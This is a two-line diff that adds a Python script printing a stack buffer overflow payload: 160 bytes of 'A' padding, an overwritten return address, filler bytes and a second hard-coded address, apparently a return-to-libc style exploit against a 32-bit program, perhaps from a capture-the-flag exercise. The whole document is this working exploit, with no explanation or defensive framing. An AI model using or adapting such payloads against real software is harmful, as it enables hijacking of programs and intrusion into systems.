@@ -1,0 +1,2 @@
+s = 'A' * 160 + b"\x20\x84\x04\x08" + "BBBB" + b"\x8f\x78\xf6\xf7"
+print(s)
